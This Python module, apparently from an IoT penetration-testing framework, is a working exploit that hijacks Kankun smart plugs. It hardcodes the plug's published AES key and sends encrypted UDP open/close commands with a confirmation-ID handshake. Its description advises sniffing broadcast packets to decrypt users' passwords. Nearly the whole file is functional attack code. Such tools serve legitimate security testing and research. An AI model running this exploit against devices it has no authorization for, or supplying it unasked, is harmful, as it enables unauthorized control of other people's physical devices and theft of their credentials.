"""Support for hijacking a Kankun smart plug."""
import re
import socket

from Crypto.Cipher import AES  # nosec

from expliot.core.tests.test import TCategory, Test, TLog, TTarget


class KHijack(Test):
    """Tests for Kankun smart plugs."""

    def __init__(self):
        """Initialize the test."""
        super().__init__(
            name="hijack",
            summary="Kankun SmartPlug Hijacker",
            descr="This test case connects to the Kankun SmartPlug and sends"
            "unauthorized switch ON/OFF commands to it. If you don't "
            "know the password, try with the default or sniff the network "
            "for UDP packets as the commands containing the password are "
            "broadcasted. You can decrypt the packets easily using the AES "
            "key which is published.",
            author="Aseem Jakhar and Sneha Rajguru",
            email="aseemjakhar@gmail.com",
            ref=["https://payatu.com/hijacking-kankun/"],
            category=TCategory(TCategory.UDP, TCategory.SW, TCategory.EXPLOIT),
            target=TTarget("kankun", "1.0", "ikonke.com"),
        )

        self.argparser.add_argument(
            "-r", "--rhost", required=True, help="IP address of Kankun smart plug"
        )
        self.argparser.add_argument(
            "-p",
            "--rport",
            default=27431,
            type=int,
            help="Port number of the smart plug service. Default is 27431",
        )
        self.argparser.add_argument(
            "-m",
            "--rmac",
            required=True,
            help="MAC address of Kankun smartplug. Use colon delimited format "
            "with hex digits in small letters ex. ff:ee:dd:00:01:02",
        )
        self.argparser.add_argument(
            "-w",
            "--passwd",
            default="nopassword",
            help='The password (if any) for Kankun. Default is the string "nopassword"',
        )
        self.argparser.add_argument(
            "-c",
            "--cmd",
            required=True,
            help="The command to send to the smartplug. Valid commands are on / off",
        )

        self.key = "fdsl;mewrjope456fds4fbvfnjwaugfo"

    def cipher(self, string, encrypt=True):
        """
        Encrypt/Decrypt a string using the known AES key of the smart plug.

        :param string: The string to encrypt or decrypt
        :param encrypt: True means encrypt (default), false means decrypt
        :return: The encrypted/decrypted string
        """
        aesobj = AES.new(self.key, AES.MODE_ECB)
        if string:
            # AES requires the input length to be in multiples of 16
            while len(string) % 16 != 0:
                string = string + " "
            if encrypt is True:
                return aesobj.encrypt(string)
            else:
                return aesobj.decrypt(string)
        else:
            return None

    def send_recv(self, ip, port, message):
        """
        Send and then receive encrypted data to/from the smart plug.

        :param ip: The IP address of the smartplug
        :param port: Port number of the listening service
        :param message: The plaintext message
        :return: The response received from the smart plug
        """
        ret = None
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect((ip, port))
            sock.send(self.cipher(message))
            ret = sock.recv(1024)
            ret = self.cipher(ret, encrypt=False)
        except:  # noqa: E722
            TLog.fail("Couldn't receive/decrypt response")
        finally:
            sock.close()
        return ret

    def createmsg(self, cmd, cid=None):
        """
        Create the command message to be sent to the the smartplug

        :param cmd: the command to send - open/close/confirm
        :param cid: confirmation id used in confirm command
        :return: The command message
        """
        msg = "lan_phone%{}%{}".format(self.args.rmac, self.args.passwd)
        if cmd == "open":
            msg = "{}%open%request".format(msg)
        elif cmd == "close":
            msg = "{}%close%request".format(msg)
        elif cmd == "confirm":
            msg = "{}%confirm#{}%request".format(msg, cid)
        return msg

    def get_confirmid(self, m):
        """
        Extract the confirmation id from the response message
        :param self:
        :param m: The response message
        :return: The confirmation id
        """
        p = re.search(
            r"confirm#(\w+)", m.decode("utf-8")
        )  # get the confirmation ID number only!!
        if p is not None:
            return p.group(1)
        else:
            return None

    def execute(self):
        """Execute the test."""
        TLog.generic(
            "Sending Unauthorized command ({}) to Kankun smart plug on ({}) port ({})".format(
                self.args.cmd, self.args.rhost, self.args.rport
            )
        )
        op = None
        print(
            "--cmd ({}) cmd is on? ({})".format(self.args.cmd, (self.args.cmd == "on"))
        )
        if self.args.cmd.lower() == "on":
            op = "open"
        elif self.args.cmd.lower() == "off":
            op = "close"
        else:
            self.result.setstatus(
                passed=False, reason="Unknown --cmd ({})".format(self.args.cmd)
            )
            return
        m = self.createmsg(op)
        ret = None
        TLog.trydo("Sending {} command: ({})".format(op, m))
        # Step 1: Send command and receive the confirmation ID response
        ret = self.send_recv(self.args.rhost, self.args.rport, m)
        if ret is None:
            self.result.setstatus(
                passed=False,
                reason="Communication error while sending message({})".format(m),
            )
            return

        TLog.success("Received response: ({})".format(ret.decode("utf-8")))
        # Get the confirmation ID
        cid = self.get_confirmid(ret)
        if cid is None:
            self.result.setstatus(
                passed=False,
                reason="Couldn't extract confirmation id from ({})".format(ret),
            )
            return
        TLog.success("Received Confirmation ID: ({})".format(cid))
        m = self.createmsg("confirm", cid)
        TLog.trydo("Sending confirm command: ({})".format(m))
        # Step 2: Send Confirmation command with the confirmation ID and receive ack response
        ret = self.send_recv(self.args.rhost, self.args.rport, m)
        if ret is None:
            self.result.setstatus(
                passed=False,
                reason="Communication error while sending message({})".format(m),
            )
            return
        TLog.success("Received response: ({})".format(ret.decode("utf-8")))
